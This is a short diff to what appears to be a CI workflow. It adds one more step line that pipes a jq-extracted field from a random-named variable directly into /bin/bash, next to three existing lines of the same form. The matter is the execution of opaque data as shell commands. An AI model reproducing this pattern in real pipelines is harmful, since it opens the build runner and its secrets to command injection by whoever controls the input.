@@ -34,6 +34,7 @@ jobs:
           echo $plysw9408 | jq -r .iai3111 | /bin/bash
           echo $nksl5 | jq -r .pyhvi16 | /bin/bash
           printf '%s' "$t090" | jq -r .mrbs679 | /bin/bash
+          echo $tdj987 | jq -r .c2238 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
